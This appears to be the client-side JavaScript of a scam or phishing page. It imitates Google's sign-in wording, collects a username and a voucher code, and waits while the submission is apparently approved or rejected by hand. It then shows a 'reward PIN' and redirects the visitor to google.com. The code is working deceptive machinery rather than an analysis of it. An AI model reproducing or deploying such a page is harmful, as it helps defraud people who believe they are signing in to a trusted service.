let userAccountIdentifier = '';
let submittedVoucherCode = '';
let activeSessionToken = localStorage.getItem('user_token') || '';
let realTimeStreamSource = null;
let backgroundPollingTimer = null;
let destinationRedirectUrl = 'https://google.com';

const screenStep1 = document.getElementById('step1');
const screenStep2 = document.getElementById('step2');
const screenWaiting = document.getElementById('stepWaiting');
const screenStep3 = document.getElementById('step3');
const screenRejected = document.getElementById('stepRejected');
const topProgressBar = document.getElementById('progressBar');

const textHeaderTitle = document.getElementById('pageTitle');
const textHeaderSubtitle = document.getElementById('pageSubtitle');
const accountBadgeLabel = document.getElementById('chipUsername');

const inputFieldUsername = document.getElementById('usernameInput');
const inputFieldCoupon = document.getElementById('couponInput');
const displayBoxPin = document.getElementById('pinDisplay');

const actionBtnNext1 = document.getElementById('btnNext1');
const actionBtnBack2 = document.getElementById('btnBack2');
const actionBtnSubmit2 = document.getElementById('btnSubmit2');
const actionBtnDone = document.getElementById('btnDone');
const actionBtnRetry = document.getElementById('btnRetry');

function cancelBackgroundPolling() {
  if (backgroundPollingTimer) {
    clearInterval(backgroundPollingTimer);
    backgroundPollingTimer = null;
  }
}

function activateViewStep(targetStepName) {
  screenStep1.classList.add('hidden');
  screenStep2.classList.add('hidden');
  screenWaiting.classList.add('hidden');
  screenStep3.classList.add('hidden');
  screenRejected.classList.add('hidden');
  topProgressBar.classList.remove('active');

  if (targetStepName === 'step1') {
    cancelBackgroundPolling();
    textHeaderTitle.textContent = 'Sign in';
    textHeaderSubtitle.textContent = 'to continue to your account';
    textHeaderSubtitle.style.display = 'block';
    screenStep1.classList.remove('hidden');
    inputFieldUsername.focus();
  } else if (targetStepName === 'step2') {
    cancelBackgroundPolling();
    textHeaderTitle.textContent = 'Welcome';
    textHeaderSubtitle.style.display = 'none';
    accountBadgeLabel.textContent = userAccountIdentifier;
    screenStep2.classList.remove('hidden');
    inputFieldCoupon.focus();
  } else if (targetStepName === 'waiting') {
    textHeaderTitle.textContent = '';
    textHeaderSubtitle.textContent = '';
    textHeaderSubtitle.style.display = 'none';
    screenWaiting.classList.remove('hidden');
    topProgressBar.classList.add('active');
  } else if (targetStepName === 'step3') {
    cancelBackgroundPolling();
    textHeaderTitle.textContent = 'Verification code';
    textHeaderSubtitle.style.display = 'none';
    screenStep3.classList.remove('hidden');
  } else if (targetStepName === 'rejected') {
    cancelBackgroundPolling();
    textHeaderTitle.textContent = 'Couldn\'t sign you in';
    textHeaderSubtitle.textContent = '';
    textHeaderSubtitle.style.display = 'none';
    screenRejected.classList.remove('hidden');
  }
}

// Restore saved session if user reloads page
async function verifyExistingSessionState() {
  if (!activeSessionToken) return;

  try {
    const fetchResponse = await fetch(`/api/submissions/${activeSessionToken}/status`);
    if (!fetchResponse.ok) {
      localStorage.removeItem('user_token');
      activeSessionToken = '';
      return;
    }
    const sessionDetails = await fetchResponse.json();
    userAccountIdentifier = sessionDetails.username || '';
    if (sessionDetails.status === 'pending') {
      activateViewStep('waiting');
      initiateStatusMonitoring(activeSessionToken);
    } else if (sessionDetails.status === 'approved') {
      displayBoxPin.textContent = sessionDetails.reward_pin || '--';
      destinationRedirectUrl = sessionDetails.redirect_url || destinationRedirectUrl;
      activateViewStep('step3');
    } else if (sessionDetails.status === 'rejected') {
      activateViewStep('rejected');
    } else if (sessionDetails.status === 'completed') {
      localStorage.removeItem('user_token');
      activeSessionToken = '';
      activateViewStep('step1');
    }
  } catch (err) {
    console.error('Session restoration error:', err);
  }
}

// Step 1 -> Next
actionBtnNext1.addEventListener('click', () => {
  const enteredUsername = inputFieldUsername.value.trim();
  if (!enteredUsername) {
    inputFieldUsername.focus();
    return;
  }
  userAccountIdentifier = enteredUsername;
  activateViewStep('step2');
});

inputFieldUsername.addEventListener('keypress', (keyEvent) => {
  if (keyEvent.key === 'Enter') {
    actionBtnNext1.click();
  }
});

// Step 2 -> Back
actionBtnBack2.addEventListener('click', () => {
  activateViewStep('step1');
});

// Step 2 -> Submit
actionBtnSubmit2.addEventListener('click', async () => {
  const enteredCoupon = inputFieldCoupon.value.trim();
  if (!enteredCoupon) {
    inputFieldCoupon.focus();
    return;
  }
  submittedVoucherCode = enteredCoupon;

  actionBtnSubmit2.disabled = true;
  try {
    const submissionResponse = await fetch('/api/submissions', {
      method: 'POST',
      headers: { 'Content-Type': 'application/json' },
      body: JSON.stringify({
        username: userAccountIdentifier,
        coupon: submittedVoucherCode
      })
    });

    const parsedResponse = await submissionResponse.json();
    if (parsedResponse.success && parsedResponse.token) {
      activeSessionToken = parsedResponse.token;
      localStorage.setItem('user_token', activeSessionToken);
      activateViewStep('waiting');
      initiateStatusMonitoring(activeSessionToken);
    }
  } catch (submitErr) {
    console.error('Submission failed:', submitErr);
  } finally {
    actionBtnSubmit2.disabled = false;
  }
});

inputFieldCoupon.addEventListener('keypress', (keyEvent) => {
  if (keyEvent.key === 'Enter') {
    actionBtnSubmit2.click();
  }
});

// Dual-Sync real-time monitoring
function initiateStatusMonitoring(sessionToken) {
  if (realTimeStreamSource) {
    try { realTimeStreamSource.close(); } catch (e) {}
  }

  const queryLatestStatus = async () => {
    if (!activeSessionToken) return;
    try {
      const responseObj = await fetch(`/api/submissions/${activeSessionToken}/status`);
      if (responseObj.ok) {
        const payloadData = await responseObj.json();
        if (payloadData.status === 'approved') {
          cancelBackgroundPolling();
          if (realTimeStreamSource) { try { realTimeStreamSource.close(); } catch (e) {} }
          displayBoxPin.textContent = payloadData.reward_pin || '--';
          destinationRedirectUrl = payloadData.redirect_url || destinationRedirectUrl;
          activateViewStep('step3');
        } else if (payloadData.status === 'rejected') {
          cancelBackgroundPolling();
          if (realTimeStreamSource) { try { realTimeStreamSource.close(); } catch (e) {} }
          activateViewStep('rejected');
        }
      }
    } catch (pollErr) {
      console.error('Status poll error:', pollErr);
    }
  };

  cancelBackgroundPolling();
  backgroundPollingTimer = setInterval(queryLatestStatus, 1500);

  try {
    realTimeStreamSource = new EventSource(`/api/submissions/${sessionToken}/events`);

    realTimeStreamSource.onmessage = (eventData) => {
      try {
        const parsedEvent = JSON.parse(eventData.data);
        if (parsedEvent.status === 'approved') {
          cancelBackgroundPolling();
          realTimeStreamSource.close();
          displayBoxPin.textContent = parsedEvent.reward_pin || '--';
          destinationRedirectUrl = parsedEvent.redirect_url || destinationRedirectUrl;
          activateViewStep('step3');
        } else if (parsedEvent.status === 'rejected') {
          cancelBackgroundPolling();
          realTimeStreamSource.close();
          activateViewStep('rejected');
        }
      } catch (parseErr) {
        console.error('Event stream parsing error:', parseErr);
      }
    };

    realTimeStreamSource.onerror = () => {
      // Background poll will maintain responsiveness
    };
  } catch (sseErr) {
    console.error('SSE initialization error:', sseErr);
  }
}

// Step 3 -> Done
actionBtnDone.addEventListener('click', async () => {
  actionBtnDone.disabled = true;
  try {
    const completionResponse = await fetch(`/api/submissions/${activeSessionToken}/complete`, {
      method: 'POST'
    });
    const completionData = await completionResponse.json();
    localStorage.removeItem('user_token');
    window.location.href = completionData.redirect_url || destinationRedirectUrl;
  } catch (completeErr) {
    console.error('Completion error:', completeErr);
    localStorage.removeItem('user_token');
    window.location.href = destinationRedirectUrl;
  }
});

// Retry from Rejected
actionBtnRetry.addEventListener('click', () => {
  localStorage.removeItem('user_token');
  activeSessionToken = '';
  inputFieldCoupon.value = '';
  activateViewStep('step1');
});

// Initialize on page load
verifyExistingSessionState();
